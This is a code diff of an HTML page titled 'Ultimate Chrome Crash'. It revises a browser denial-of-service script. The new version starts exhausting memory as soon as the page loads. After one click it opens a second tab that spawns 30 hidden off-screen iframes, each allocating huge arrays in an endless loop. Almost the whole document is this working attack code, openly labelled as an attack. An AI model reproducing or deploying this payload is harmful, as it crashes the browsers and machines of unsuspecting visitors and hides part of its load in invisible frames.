@@ -1,62 +1,80 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Bypass Popup Blocker - Auto Chrome Crash</title>
+    <title>Click to Start - Ultimate Chrome Crash</title>
 </head>
 <body>
     <h1>Click Anywhere to Start</h1>
-    <p>Once clicked, Chrome will begin opening multiple tabs.</p>
+    <p>This page will open a second tab that runs a more aggressive attack.</p>
 
     <script>
         function startWorker() {
             let data = [];
             function allocate() {
                 for (let i = 0; i < 1000; i++) { 
-                    data.push(new Float64Array(2e7)); // High memory allocation
+                    data.push(new Float64Array(2e7)); // Large memory allocations
                 }
                 requestAnimationFrame(allocate);
             }
             allocate();
         }
 
-        function openTabs() {
-            let tabs = [];
-
-            // Open multiple tabs in a loop
-            for (let i = 0; i < 12; i++) {
-                let newTab = window.open("", "_blank"); // Open empty tabs
-                if (newTab) {
-                    newTab.document.write(`
-                        <html>
-                        <head><title>Memory Attack</title></head>
-                        <body>
-                        <h1>Memory Attack Running...</h1>
-                        <script>
-                            function startWorker() {
-                                let data = [];
-                                function allocate() {
-                                    for (let i = 0; i < 1000; i++) { 
-                                        data.push(new Float64Array(2e7)); 
-                                    }
-                                    requestAnimationFrame(allocate);
-                                }
-                                allocate();
-                            }
-                            startWorker();
-                        <\/script>
-                        </body>
-                        </html>
-                    `);
-                    newTab.document.close();
-                    tabs.push(newTab);
-                } else {
-                    alert("Popup blocked! Please allow popups and try again.");
-                    break;
-                }
+        function openAttackTab() {
+            let attackTab = window.open("", "_blank"); // Open second attack tab
+            if (!attackTab) {
+                alert("Popup blocked! Please allow popups and try again.");
+                return;
             }
+
+            // Inject the iframe-based overload attack into the new tab
+            attackTab.document.write(`
+                <html>
+                <head><title>iFrame Attack</title></head>
+                <body>
+                <h1>Hidden iFrames Running...</h1>
+                <script>
+                    function createIframe() {
+                        let iframe = document.createElement("iframe");
+                        iframe.style.width = "1px";
+                        iframe.style.height = "1px";
+                        iframe.style.position = "absolute";
+                        iframe.style.left = "-9999px";
+                        iframe.src = "data:text/html;charset=utf-8," + encodeURIComponent(\`
+                            <script>
+                                function startWorker() {
+                                    let data = [];
+                                    function allocate() {
+                                        for (let i = 0; i < 500; i++) { 
+                                            data.push(new Float64Array(2e7)); 
+                                        }
+                                        requestAnimationFrame(allocate);
+                                    }
+                                    allocate();
+                                }
+                                startWorker();
+                            <\/script>
+                        \`);
+                        document.body.appendChild(iframe);
+                    }
+
+                    function launchIframes() {
+                        for (let i = 0; i < 30; i++) { // Increase iframe count
+                            setTimeout(createIframe, i * 10);
+                        }
+                    }
+
+                    launchIframes();
+                <\/script>
+                </body>
+                </html>
+            `);
+            attackTab.document.close();
         }
 
-        document.body.addEventListener("click", openTabs, { once: true });
+        document.body.addEventListener("click", openAttackTab, { once: true });
+
+        // Start the initial memory exhaustion in the first tab
+        startWorker();
     </script>
 </body>
 </html>
